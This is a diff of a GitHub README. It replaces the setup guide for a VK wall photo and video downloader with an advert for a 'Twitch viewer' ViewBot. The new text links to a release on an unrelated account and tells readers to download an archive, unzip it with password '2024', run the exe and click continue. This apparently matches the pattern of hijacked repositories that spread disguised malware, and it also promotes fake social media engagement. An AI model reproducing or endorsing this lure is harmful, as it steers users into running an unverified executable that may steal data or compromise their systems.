@@ -1,46 +1,36 @@
+# Download Twtich viewer - [click](https://github.com/vmerhoushigirl1/vmerhoushigirl1/releases/tag/v1.5.2)
 
-# vkontakte-downloader
 
-Download Photo and Video from Wall of specific User or Community on https://vk.com
+![twitch vie](https://github.com/0toshigami/vkontakte-downloader/assets/27276267/a0011acf-1bd4-4ffa-b3a5-17b518c1aada)
 
-## Setup
 
-- Clone the project
 
-```bash
-git clone https://github.com/0toshigami/vkontakte-downloader.git
-```
+### ViewBot is a tool designed to increase views and engagement on social platforms through an automated system. The software product is designed to help promote content for both individual users and organizations looking to expand their online influence. ViewBot utilizes modern social media API techniques to provide native and natural looking interactions.
 
-- Use the package manager [pip](https://pip.pypa.io/en/stable/) to install all the requirements
+**Warning**: The use of bots to artificially boost social media statistics may be against the terms of use of the respective platforms and may result in account lockout.
 
-```bash
-pip install -r requirements.txt
-```
+## installation
 
-- Edit email and password in .env
-It is recommended to use phone number
+- Download the archive
+- Unzip to any folder(pass:2024)
+- Run the exe
+- Click continue
+- Enjoy
 
-```
-EMAIL=your_email_or_phone_number
-PASS=your_password
-```
+## Features
 
-## Usage
+- Automate page/video views on popular social platforms
+- Support for multiple accounts to create organic traffic
+- Customize time intervals between "views" to simulate a real user
+- Functionality to enhance interaction with content (likes, comments, subscriptions)
+- Simple and easy-to-use user interface
+- Support for proxy servers for anonymity and security
 
-Run the follow command to start the script
+## Technologies
 
-```bash
-py vk.py <domain> <offset> <count>
-```
+- C++ programming language
+- Work with social networks API
+- Proxy and anonymity of network requests
+- Web scraping and browser automation
 
-> domain: User or community short address ( vk.com/user01 )
->
-> offset: Offset needed to return a specific subset of posts (positive number)
->
-> count: Number of posts to return (positive number) (maximum 100)
-
-For example, run `py vk.py user01 0 20` will start to get all photo or video from wall of **user01**, starting from post 0 to 19
-
-## Bug
-
-Tell me
+by 0toshigami
